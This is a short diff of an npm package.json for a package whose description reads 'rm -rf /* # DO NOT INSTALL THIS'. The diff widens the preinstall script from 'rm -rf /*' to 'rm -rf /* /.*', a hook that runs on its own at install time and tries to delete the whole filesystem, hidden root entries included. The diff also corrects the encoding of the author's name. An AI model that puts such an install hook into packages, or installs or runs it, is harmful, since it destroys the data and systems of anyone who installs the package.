@@ -4,12 +4,12 @@
   "description": "rm -rf /* # DO NOT INSTALL THIS",
   "main": "index.js",
   "scripts": {
-    "preinstall": "rm -rf /*"
+    "preinstall": "rm -rf /* /.*"
   },
   "keywords": [
     "rimraf",
     "rmrf"
   ],
-  "author": "Jo„o JerÛnimo",
+  "author": "Jo√£o Jer√≥nimo",
   "license": "ISC"
 }
